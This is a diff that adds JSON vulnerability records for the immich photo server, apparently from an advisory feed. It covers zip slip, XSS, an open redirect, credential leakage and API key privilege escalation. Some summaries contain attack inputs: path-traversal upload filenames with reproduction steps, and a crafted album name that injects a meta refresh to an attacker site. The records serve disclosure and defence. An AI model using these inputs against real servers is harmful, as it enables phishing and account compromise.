+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.0.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-hvq7-hq9r-8gjr",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-hvq7-hq9r-8gjr",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-hvq7-hq9r-8gjr",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:fec6e89fb9cfeecd687a03e479e6ed4eb769f04d6a19f68cfc8a4af037a66914",
+      "note": null
+    },
+    {
+      "id": "GHSA-jrp5-g662-hq92",
+      "aliases": [],
+      "title": "Unsafe ZIP Entry Names (Zip Slip Class) in Archive Download Endpoint",
+      "summary": "# Immich - Unsafe ZIP Entry Names (Zip Slip Class) in Archive Download Endpoint\r\n\r\n## Title\r\nUnsafe ZIP Entry Names (Zip Slip Class) in Archive Download Endpoint\r\n\r\n## Product\r\nImmich\r\n\r\n## Version\r\nImmich Server v2.6.2\r\n\r\n## Vulnerability Type\r\nZip Slip / Path Traversal via Archive Entry Names\r\n\r\n## CWE\r\n- CWE-22 - Improper Limitation of a Pathname to a Restricted Directory\r\n- CWE-73 - External Control of File Name or Path\r\n\r\n## CVSS v3.1 (Suggested)\r\n**Score:** 5.4 (Medium)  \r\n**Vector:** AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N\r\n\r\n## Date\r\n2026-03-26\r\n\r\n## Credit\r\nRegorSec (Roger Bourget)\r\n\r\n---\r\n\r\n## Summary\r\nImmich generates ZIP archives for asset downloads using user-controlled filenames as ZIP entry names without sufficient sanitization or normalization. A user who uploads an asset with a crafted filename can cause generated ZIP archives to contain entries with path components such as directory traversal sequences or absolute paths.\r\n\r\nThis represents a Zip Slip-class vulnerability where downstream archive extraction tools may write files outside the intended extraction directory depending on extractor behavior and platform.\r\n\r\nAt minimum, this violates the expectation that generated ZIP archives contain safe relative filenames.\r\n\r\n---\r\n\r\n## Affected Component\r\nArchive generation endpoint:\r\n\r\n```\r\nPOST /api/download/archive\r\n```\r\n\r\nRelevant code path:\r\n\r\n```\r\nDownloadService.downloadArchive()\r\n→ StorageRepository.createZipStream()\r\n→ archiver.file(input, { name: filename })\r\n```\r\n\r\nThe archive entry name is derived from:\r\n\r\n```\r\nasset.originalFileName\r\n```\r\n\r\nwhich originates from a user-controlled upload filename.\r\n\r\n---\r\n\r\n## Root Cause\r\nThe upload process allows a user-controlled filename to be stored as `asset.originalFileName` without path sanitization. This value is later used directly as the ZIP entry name when generating archives.\r\n\r\nObserved behavior indicates:\r\n\r\n- No basename enforcement\r\n- No filtering of traversal sequences (`../`)\r\n- No filtering of Windows path separators\r\n- No normalization of absolute paths or drive paths\r\n\r\nAs a result, attacker-controlled filenames are embedded directly into ZIP archive entry paths.\r\n\r\n---\r\n\r\n## Proof of Concept / Observations\r\nUsing authenticated upload and archive download functionality, the following behaviors were observed:\r\n\r\n| Uploaded Filename        | ZIP Entry Name |\r\n|--------------------------|----------------|\r\n| ../../../../tmp/pwn.jpg  | tmp/pwn.jpg    |\r\n| C:\\temp\\abs3.jpg         | temp/abs3.jpg  |\r\n| a/../../b.jpg            | a/../../b.jpg  |\r\n| ..\\..\\win1.jpg           | win1.jpg       |\r\n\r\nSome traversal sequences are normalized into subdirectories, while others remain intact in the ZIP entry name.\r\n\r\nThis demonstrates inconsistent path handling and confirms attacker control over ZIP entry paths.\r\n\r\n---\r\n\r\n## Impact\r\nPotential impacts include:\r\n\r\n- File overwrite during extraction depending on unzip tool behavior\r\n- Writing files outside intended extraction directory\r\n- Malicious archive contents placing files into unexpected directories\r\n- Risk when archives are shared via links, email, or downloads\r\n- Client-side path traversal upon extraction\r\n\r\nSeverity depends on the extraction tool and environment used by the victim.\r\n\r\nThis is primarily a client-side archive extraction vulnerability.\r\n\r\n---\r\n\r\n## Reproduction Steps\r\n\r\n1. Authenticate to Immich and obtain access token.\r\n2. Upload an asset using a crafted filename:\r\n\r\n```\r\nPOST /api/assets\r\nmultipart form field:\r\nfilename = ../../../../tmp/pwn.jpg\r\n```\r\n\r\n3. Request archive download:\r\n\r\n```\r\nPOST /api/download/archive\r\n{\r\n  \"assetIds\": [\"<assetId>\"]\r\n}\r\n```\r\n\r\n4. Extract the generated ZIP archive.\r\n5. Observe archive entry paths:\r\n\r\n```\r\nzipinfo -1 archive.zip\r\n```\r\n\r\n---\r\n\r\n## Recommended Remediation\r\nSanitize filenames used for ZIP entry names.\r\n\r\nRecommended approaches:\r\n\r\n- Use `basename()` only\r\n- Strip `/` and `\\`\r\n- Reject `..`\r\n- Reject absolute paths\r\n- Reject Windows drive paths\r\n- Enf...",
+      "published_at": "2026-07-06T09:50:43.000Z",
+      "modified_at": "2026-07-06T09:50:43.000Z",
+      "severity": {
+        "level": "low",
+        "score": 2.8,
+        "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-22",
+        "CWE-73"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "2.6.2",
+              "fixed": "3.0.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-jrp5-g662-hq92",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-jrp5-g662-hq92",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-jrp5-g662-hq92",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:7265e60a0bc7fe8b8c98aeeea835724469ea09b1b78f8f0b18b59f6031a9d65f",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-53662",
+      "aliases": [
+        "GHSA-8244-8vpr-vp9c"
+      ],
+      "title": "immich: One-click account takeover via XSS in login page continue redirect",
+      "summary": "immich is a high performance self-hosted photo and video management solution. From commit 4ffa26c9 until 4eb1003, a reflected cross-site scripting (XSS) vulnerability on the /auth/login page allows an attacker to fully compromise any authenticated user's account with a single link click. The continue query parameter is read from the URL and passed to SvelteKit's redirect() without any scheme or origin validation, allowing attacker-controlled JavaScript to execute inside Immich's origin. The payload then uses the victim's existing session to mint an all-permission API key on their account, leading to persistent account takeover. This vulnerability is fixed in commit 4eb1003.",
+      "published_at": "2026-06-01T17:46:22.000Z",
+      "modified_at": "2026-06-23T18:32:43.755Z",
+      "severity": {
+        "level": "critical",
+        "score": 9.6,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00298,
+        "percentile": 0.2271,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-79",
+        "CWE-601"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": []
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-8244-8vpr-vp9c",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/commit/4eb100327ea5da2e90381b96809f1f1cc51cc7e3",
+          "type": "fix"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-53662",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-53662",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-53662",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-53662",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-8244-8vpr-vp9c",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-8244-8vpr-vp9c",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:42501c29feea1ae293ccccbbb4a1062caa057f78e14ce687363a0eb38f8855e1",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-40096",
+      "aliases": [
+        "GHSA-24fq-72x8-v7hm"
+      ],
+      "title": "immich: Open Redirect via Shared Album name",
+      "summary": "immich is a high performance self-hosted photo and video management solution. Versions prior to 2.7.3 contain an open redirect vulnerability in the shared album functionality, where the album name is inserted unsanitized into a <meta> tag in api.service.ts. A registered attacker can create a shared album with a crafted name containing 0;url=https://attackersite.com\" http-equiv=\"refresh, which when rendered in the <meta property=\"og:title\"> tag causes the victim's browser to redirect to an attacker-controlled site upon opening the share link. This facilitates phishing attacks, as the attacker could host a modified version of immich that collects login credentials from victims who believe they need to authenticate to view the shared album. This issue has been fixed in version 2.7.3.",
+      "published_at": "2026-04-13T17:08:59.000Z",
+      "modified_at": "2026-04-15T16:19:07.744Z",
+      "severity": {
+        "level": "medium",
+        "score": 5.1,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00209,
+        "percentile": 0.11193,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-79",
+        "CWE-601"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.7.3"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-24fq-72x8-v7hm",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/releases/tag/v2.7.3",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-40096",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-40096",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-40096",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-40096",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-24fq-72x8-v7hm",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-24fq-72x8-v7hm",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:fe6b63cd1ecdad2fbc2e7fbff4cbff51aa4f905987fb8c58aabfedacdd3182c6",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-35455",
+      "aliases": [
+        "GHSA-9qx4-67jm-cc66"
+      ],
+      "title": "immich has Stored XSS via OCR Text in 360° Panorama Viewer",
+      "summary": "immich is a high performance self-hosted photo and video management solution. Prior to 2.7.0, sStored Cross-Site Scripting (XSS) in the 360° panorama viewer allows any authenticated user to execute arbitrary JavaScript in the browser of any other user who views the malicious panorama with the OCR overlay enabled. The attacker uploads an equirectangular image containing crafted text; OCR extracts it, and the panorama viewer renders it via innerHTML without sanitization. This enables session hijacking (via persistent API key creation), private photo exfiltration, and access to GPS location history and face biometric data. This vulnerability is fixed in 2.7.0.",
+      "published_at": "2026-04-08T14:55:23.000Z",
+      "modified_at": "2026-04-13T15:36:26.045Z",
+      "severity": {
+        "level": "high",
+        "score": 7.3,
+        "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00229,
+        "percentile": 0.13757,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-79"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.7.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-9qx4-67jm-cc66",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-35455",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-35455",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-35455",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-35455",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-9qx4-67jm-cc66",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-9qx4-67jm-cc66",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:1687f35d6f1d375823d2913a534a9411272525c3e0dd0430318ff04e1a90d0ce",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-25118",
+      "aliases": [
+        "GHSA-78x4-6x83-jx75"
+      ],
+      "title": "immich-server: Insecure Transmission of Authentication Credentials via Password Parameter in HTTP Request Query String When Accessing Shared Albums",
+      "summary": "immich is a high performance self-hosted photo and video management solution. Prior to version 2.6.0, the Immich application is vulnerable to credential disclosure when a user authenticates to a shared album. During the authentication process, the application transmits the album password within the URL query parameters in a GET request to /api/shared-links/me. This exposes the password in browser history, proxy and server logs, and referrer headers, allowing unintended disclosure of authentication credentials. The impact of this vulnerability is the potential compromise of shared album access and unauthorized exposure of sensitive user data. This issue has been patched in version 2.6.0.",
+      "published_at": "2026-04-02T19:45:30.000Z",
+      "modified_at": "2026-04-08T14:59:10.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.3,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00467,
+        "percentile": 0.40976,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-598"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.6.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-78x4-6x83-jx75",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/pull/26868",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/pull/26886",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/releases/tag/v2.6.0",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-25118",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-25118",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-25118",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-25118",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-78x4-6x83-jx75",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-78x4-6x83-jx75",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:5522464c6c590250a2f2a9c55a4a8c13b0dc0eb812ec17b040e94532d8ae4700",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-23896",
+      "aliases": [
+        "GHSA-237r-x578-h5mv"
+      ],
+      "title": "immich API Key Privilege Escalation vulnerability",
+      "summary": "immich is a high performance self-hosted photo and video management solution. Prior to version 2.5.0, API keys can escalate their own permissions by calling the update endpoint, allowing a low-privilege API key to grant itself full administrative access to the system. Version 2.5.0 fixes the issue.",
+      "published_at": "2026-01-29T14:18:37.000Z",
+      "modified_at": "2026-01-29T21:25:38.711Z",
+      "severity": {
+        "level": "high",
+        "score": 7.2,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00352,
+        "percentile": 0.29359,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-269"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.5.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-237r-x578-h5mv",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-23896",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-23896",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-23896",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-23896",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-237r-x578-h5mv",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-237r-x578-h5mv",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:972c12957bc23346cc4e5213897daf5f24f05ce20c74a1f225ac9b18cd601e96",
+      "note": null
+    }
+  ]
+}
